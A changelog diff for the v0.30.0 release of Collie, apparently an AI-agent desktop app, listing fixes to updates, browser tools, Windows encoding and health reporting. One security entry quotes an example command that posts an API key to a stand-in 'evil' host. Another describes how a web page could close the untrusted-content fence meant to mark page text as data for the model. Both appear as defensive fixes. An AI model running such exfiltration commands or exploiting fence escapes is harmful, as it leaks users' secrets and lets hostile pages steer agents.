@@ -1,5 +1,224 @@
 # Changelog
 
+## v0.30.0 — Updates on the desktop, the inbox in the sidebar, and health you can act on
+
+- Show new Collie releases on the desktop. Settings → General → Updates checks GitHub when you
+  press *Check for updates*, or about once a day after you turn on *Check for updates
+  automatically* (off by default). A small dot on the Settings button marks a newer release, and
+  its notes are shown as plain text. A failed check says so and keeps the last answer; it is never
+  reported as "up to date".
+- Install an update with one press on Windows installer copies. Collie downloads the release you
+  were shown, verifies its published digest and Authenticode signature, closes, runs Setup and
+  starts the same pieces again; the page reconnects by itself. If a newer release appears before you
+  press Install, nothing is installed and the card asks you to check again. A paired phone can read
+  the notice but not install. Other installs are told what they can run: the macOS app is pointed
+  at the release page, Homebrew at `brew upgrade collie`, pip at `collie update --yes`.
+- `collie update --expect <version>` installs only that exact newer release (exit 3 otherwise), one
+  update runs at a time (exit 4 while another holds the lock), and the update journal records the
+  version being installed.
+- A request relayed from a paired phone can no longer present itself as local by sending its own
+  `X-Collie-Relay` header ahead of the relay's; the relay strips it and the server reads every value.
+- Add **Inbox** to the desktop sidebar. It opens email and phone inside the app instead of only
+  from Settings, and its badge counts messages to decide on, drafts to review and deliveries to
+  check. *Open task* from the inbox opens the task in the same window.
+- Stop a page's alert or confirm box from freezing the browser tools. While a dialog is showing,
+  the page cannot run anything Collie sends it, and because the extension runs one command at a
+  time, every browser command in every space then timed out until someone clicked OK by hand. The
+  extension now answers a dialog in Collie's tab as it opens: an alert is acknowledged, and a
+  confirm, prompt or "leave this page?" box is answered Cancel unless the action was given
+  `dialog: "accept"`. The tool result says what the page asked (fenced as page content) and what
+  was answered. `dialog: "accept"` asks for approval as a final action whatever the button says,
+  a box that came up after the previous action returned is only ever cancelled, and
+  `browser_open` may accept nothing but "leave this page?", and that only in a tab Collie opened
+  (never discarding unsaved work in a tab you handed over). Needs the reloaded extension (4.1)
+  and its debugger access, which the default build has.
+- Say on the desktop when Chrome is running an older Collie extension. After an update Chrome keeps
+  the old copy until it is reloaded, so the browser tools run without its fixes; Settings → General
+  now says *Chrome is running an older Collie extension (…); reload it in chrome://extensions*,
+  and `/api/healthz` carries it as `browser_extension_stale`. A newer copy (a developer's) is not
+  flagged.
+- Say why a browser action failed when the extension in Chrome is older than Collie. Chrome keeps
+  running an unpacked extension until it is reloaded, so after an update each new action came back
+  as a bare "unknown action" -- Live Copilot's page view failed that way on every tick of a session
+  (1706 times in one bridge log). The error now names both versions and says to reload the
+  extension from `chrome://extensions`; Live notes it once, uses a window screenshot, and asks again
+  after ten minutes.
+- Retry a model request whose connection Windows reports as reset. The retry patterns knew the
+  POSIX wording only, so "An existing connection was forcibly closed by the remote host" (WinError
+  10054), the 10053 abort, the 10060 connect timeout and the 10061 refusal were read as
+  unrecognised and fatal (and a truncated `IncompleteRead` too); a real run stopped on the first.
+- Say what an overflow failure was. A run whose conversation was still too long after its one
+  shrink-and-retry ended with the note meant for unrecognised errors ("matches no known pattern");
+  it now says the conversation was still too long after it was shrunk, or that recovery is off.
+- Keep a page from closing the untrusted-content fence itself. Page text, and now dialog text, is
+  wrapped in markers that tell the model it is data; a page that wrote the closing marker could end
+  the fence early and have what followed read as outside it. Copies of the markers inside the
+  content are now defused.
+- Say at once when the browser extension is not connected. With the browser closed, each browser
+  command waited out its full timeout (60 s for a form read, 4 s for each origin check) and then
+  said only "did not respond". When the extension has not been heard from for 90 seconds and holds
+  no command, the bridge now answers immediately that it is not connected and since when, and
+  queues nothing a browser opened later could run. A command the extension took but did not finish
+  is reported as held up in the page, not as a missing extension. A browser tool also stops
+  waiting for a refused connection when no bridge is running (about 2 s on Windows), and the
+  bridge probe made while setting up each run takes at most 0.15 s instead of 0.5 s there.
+- Let onboarding see the browser extension connect. The *Connect your browser* step polls
+  `/api/browser/status`, which answered 500 on every request (a name the handler used was bound
+  only in another branch), so the step kept saying "Waiting for the extension to connect…" after
+  it had connected.
+- Stop waiting on local services that are not running (Windows). A connection to a loopback port
+  nobody listens on is refused there only after about two seconds, so each probe waited out its
+  timeout: `/api/healthz` 1.0 s for a stopped web server and 1.5 s for a stopped browser bridge,
+  the onboarding browser poll 1.5 s, and the desktop app's launch 0.8 s per probe before the
+  server was up. A 0.15 s connect check now answers first. Health and `collie doctor` also look for
+  the bridge on the port the browser tools use (`COLLIE_BROWSER_BRIDGE_PORT`).
+- Keep the prompt cache through long runs. The composer stubs tool outputs older than its recent
+  window, and that boundary moved with every new message, so each turn rewrote a message the
+  provider had cached and re-read everything after it (1651 of 4467 turns in one machine's run log,
+  11.3M tokens). It now moves six messages at a time. Replayed on the Codex subscription route,
+  the share of input served from cache over turns 10-24 went from 25% to 64%, and the input
+  processed afresh fell 45%. The Anthropic route also caches the end of the history, which now
+  stays stable for a few turns. Details in `bench/experiments/2026-09-24-elision-step`.
+- Open the run menu's worker list faster. Its capability read probed each installed worker CLI one
+  after another, and Pi alone was started four times in a row (`--version` and an auth check per
+  provider). Measured on a Windows machine with Pi, Codex and Claude Code installed, the first read
+  after a minute took 5.5 s; the probes and Pi's checks now run side by side and the same read
+  takes about 2.2 s. The probe results are unchanged. Reads that arrive together (a page load asks
+  from several places) now share one probe per runner instead of each running all of them.
+- Disclose, and let you turn off, the wallpaper clock's weather line. It asks `ipapi.co` for an
+  approximate location from your network address and `api.open-meteo.com` for the weather there,
+  about every 30 minutes, which the privacy policy did not mention. `"weather": false` under
+  `"clock"` in `~/.collie/desktop.json` now stops both requests and keeps the clock.
+- Run one jobs daemon at a time, and let a restarted supervisor adopt the daemons already running.
+  A supervisor restart leaves its children running, and the next supervisor started a second
+  jobs daemon on the same database -- the "mission tick paused: database is locked" lines in one
+  machine's log -- and a second automations daemon that could not take its lock, exited, was
+  restarted and ended *circuit open*, reported stopped while one was running. The jobs daemon now
+  holds a single-instance lock and reports a heartbeat, the ambient observer reports one too, the
+  supervisor adopts a live jobs, automations or ambient daemon by its heartbeat (existing `supervisor.json` files learn this on load), and a
+  heartbeat from a process that has exited is never adopted.
+- Put the time on every line a supervised worker writes to its log (`09-23 17:39:02 [slack] …`).
+  The supervisor stamped only its own lines, so a Slack dog's 278 "connection lost" lines could not
+  be told apart from one another or matched to anything else on the machine.
+- Keep the test suite away from the developer's real browser. Two tests reached the browser bridge
+  on its fixed port (one read the form in a Collie tab, one listed tabs six times), so every suite
+  run on a machine with the bridge running sent commands to its signed-in browser; the bridge
+  audit on the developer's machine holds 96 such form reads since August. Every test now gets a
+  port nothing listens on unless it starts its own bridge, and `COLLIE_BROWSER_LIVE=1` is the one
+  way to reach the real one.
+- Keep a Slack dog restricted to the people you named after a restart. `collie slack
+  --install-autostart` dropped `--allow` from the launcher (Windows) and LaunchAgent (macOS), and the
+  supervisor kept the command line it copied from a launcher when `supervisor.json` was first
+  created, so a dog re-installed with `--allow` could come back answering anyone in its channels.
+  The launcher now records `--allow`, and the supervised dog follows its current launcher.
+- Say why the runtime needs attention. Settings → General now names the first reason (a login
+  that is missing or expired with the command that fixes it, a background service that stopped or
+  is not reporting, work waiting for a recovery decision) and how many more, with *Details*
+  opening System activity. `/api/healthz` carries these as `reasons` codes.
+- Stop reporting background workers as missing where nothing is meant to run them. The macOS app
+  and a pip `collie web` have no supervisor, yet health listed its five default workers as having no
+  heartbeat and showed *Needs attention* for good. Workers are expected only where the supervisor is
+  installed or has run.
+- Stop reporting a login you do not use as a problem. Health counted a missing Claude or Codex
+  subscription login as degraded whichever provider was configured, so someone on one subscription
+  (and every Mac, where Claude Code keeps its login in the Keychain) saw *Needs attention* and a
+  recurring "claude-oauth is missing" alert. Only the login the configured provider needs now
+  affects health and alerts; both are still listed. Claude Code routes on Windows and Linux still
+  need their sign-in file, but its expiry is not a problem because Claude Code refreshes it.
+- Name the reasoning effort an unchosen run will use. With a Default reasoning effort saved in
+  Settings, the run menu (desktop and phone) said "Auto by task" while every run used the saved
+  level; it now shows *Saved default: High* (or the level saved), refreshes right after that setting
+  is saved, and a phone refreshes run options when it is brought back to the screen.
+- Deliver an early refusal instead of a reset connection. The web server answered token and size
+  checks before reading the request body and then closed with that body unread, which resets the
+  connection; on Windows the reset also discards the answer, so a 403 (for example after a restart
+  changed the page token) could reach the browser as a network error. The unread body is now read
+  (up to 8 MB, 2 s) before the connection closes. This was the intermittent `ConnectionAbortedError`
+  (10053) in the full Windows test suite.
+- Load the semantic-memory model from the local cache without asking Hugging Face first. Each
+  process that loaded it (every `collie -p` run and Slack task, and a server's first run) made two
+  revision checks against huggingface.co (0.2-0.6 s measured, and a wait for a timeout on a slow or
+  blocked network) even when the model was already on disk.
+- Label Daily Brief sources that have nothing connected. Calendar and Email & phone used to
+  read "read just now" even with no calendar imported and no account connected; they now say
+  *not connected* on the page and in the morning email's sources line, while still counting as
+  answered.
+- Mark an accepted message as *No reply needed* in the inbox, with a short reason kept beside it.
+  It stops counting as owed in the inbox and Daily Brief, and a task that finishes afterwards keeps
+  its result without preparing or sending an automatic reply. The task itself is not changed.
+- Check and revert editor saves on installs without pytest. The desktop code editor keeps a save
+  only if the tests that cover the file still pass, but on the path used when pytest is missing
+  (the Windows install's bundled Python has none) the check crashed after the file was written:
+  the save stayed on disk unchecked and the editor was sent an error. A new test reads the source
+  for this kind of mistake (a function-local import that some path reaches before it has run),
+  which had also caused the 0.29.1 browser-status 500s.
+- Keep a program's output when it contains a byte that is not valid text. Collie read most tool
+  output as text with no fallback, and one such byte (a latin-1 or GBK source file, say) cost the
+  whole read: on Windows the output silently came back empty, elsewhere the call failed. Code
+  search then reported no matches at all when any match was in such a file, and a coding run's
+  worktree diff came back empty and then crashed the check that looks for a reverted fix. Output
+  is now decoded with a replacement character where needed; git, ripgrep and MCP servers (whose
+  stdio is UTF-8 by the spec) are read as UTF-8 whatever the Windows code page is.
+- Stop a checkpoint restore from deleting untracked files it never saved. A checkpoint lists your
+  untracked files so that restoring can put them back, and restoring then clears untracked files
+  (`git clean -fd`) because the snapshot holds the complete set. On Windows that list was read in
+  the system code page: with the default Chinese code page (936) a single file with a Chinese name
+  made the whole list unreadable, which was recorded as "no untracked files", and restoring then
+  deleted every untracked file that existed before the run (reproduced with 0.29.1's code). A
+  failed listing (git exiting with an error) was taken as empty the same way. The names are now
+  passed back to git as raw bytes, and a checkpoint whose listing cannot be read fails instead.
+  The names are also taken literally now: as patterns, an untracked file named like
+  `secret[1].env` also matched an ignored `secret1.env`, which was then saved into the checkpoint.
+- Read shell output in the encoding each line was written in, on Windows machines whose code page
+  is not UTF-8. Git, Git Bash's own tools, node and ripgrep print UTF-8, while Python programs and
+  older console tools print in the system code page, and the bash tool read everything in the
+  system code page. With the Chinese default (936), `git log`, `cat` of a source file and
+  similar commands therefore reached the model garbled. Each line is now read as UTF-8 when it is
+  valid UTF-8, and in the system code page otherwise. Machines already on UTF-8 (code page 65001)
+  are unchanged.
+- Stop a timed-out hook from stalling the run. On a timeout only the hook's shell was killed, and
+  on Windows Collie then waited for its output for as long as anything the hook had started kept
+  running (measured: 20 s for a `sleep 20 &`; forever for a background server). The whole process
+  tree is ended now (on Windows through a Job, which also reaches what outlived the hook's shell),
+  on a timeout and when the wait is interrupted, and the wait after that is bounded. Hook input is also sent as ASCII JSON, so
+  non-ASCII text no longer arrives as `?` on Windows code pages that cannot spell it.
+- Read Chinese window titles and control names on Chinese Windows. The desktop tools get window
+  titles, UI Automation names and values from Windows PowerShell, which writes to a pipe in the
+  console's OEM code page (936 there) while Collie reads UTF-8. So every Chinese title came back
+  as debris, and a window such as "微信" could not be found by its name. The same applied to the
+  now-playing title on the wallpaper and to process command lines with non-ASCII paths. These
+  scripts now write UTF-8. Machines whose code page is already UTF-8 were not affected.
+- Keep a vendor's API key from being sent to another host. When a tool call uses a key Collie has
+  redacted, the key is put back only at the last moment, and a key inside a URL was already
+  refused. That check alone let a key through in a POST body (`curl -d key=… https://evil/`), in a
+  URL assembled in a shell variable, or next to a URL given as a separate argument. Keys whose vendor
+  is recognisable (Anthropic, GitHub, Slack, AWS, Stripe, Google, Groq, xAI) are now restored only
+  when every host the call names belongs to that vendor or to this machine; otherwise the call runs
+  with the placeholder and fails visibly. Keys shared by several providers (`sk-…`) and generic
+  `api_key=` values keep the previous rule, since their destination cannot be told from the key.
+- Label facts imported from Claude Code as coming from Claude Code, on Windows. `collie mem import`
+  decided the source from a `/.claude/` in the file's path, which a Windows path never contains,
+  so every Claude Code session was recorded as `src:codex`.
+- Stop telling the model that a correct shell script is broken, on Windows. After an edit, Collie
+  checks the file's syntax, and for `.sh` files it found Git Bash but then started the bare name
+  `bash`, which Windows resolves to WSL's bash first. WSL could not see the file, so every edited
+  shell script came back with "No such file or directory" attached to the edit result.
+- Find localized cameras and microphones for recording on Windows. ffmpeg prints device names as
+  UTF-8, and Collie read them in the system code page, so under the Chinese code page a device
+  such as "麦克风 (Realtek(R) Audio)" was listed garbled and could not be opened by that name.
+  Web search through headless Chrome had the same problem: any result with accented or Chinese
+  text came back garbled on those machines.
+- Let `execute_code` scripts print any text on Windows. The script's output was written in the
+  system code page but read as UTF-8, so under the Chinese code page `print("中文")` came back as
+  replacement characters, and under 1252 it raised `UnicodeEncodeError` in the script itself.
+  Scripts now write UTF-8.
+- Re-apply a reverted fix on Windows. When a coding run in SWE mode undid all of its edits, Collie
+  restores its best diff, but the diff was written to `git apply` in text mode, which turned every
+  line ending into CRLF on Windows, so the restore never applied there. The diff is now captured
+  and re-applied as bytes and comes back exactly, whatever the user's diff settings. `run_in_env`
+  had the same problem with the patch it hands the container, and a SWE prediction patch now keeps
+  its line endings, and goes out as exact git binary patches when the diff is not UTF-8.
+
 ## v0.29.1 — Bound startup waits when the clock changes
 
 - Use elapsed time for the short wait that acknowledges a newly started background
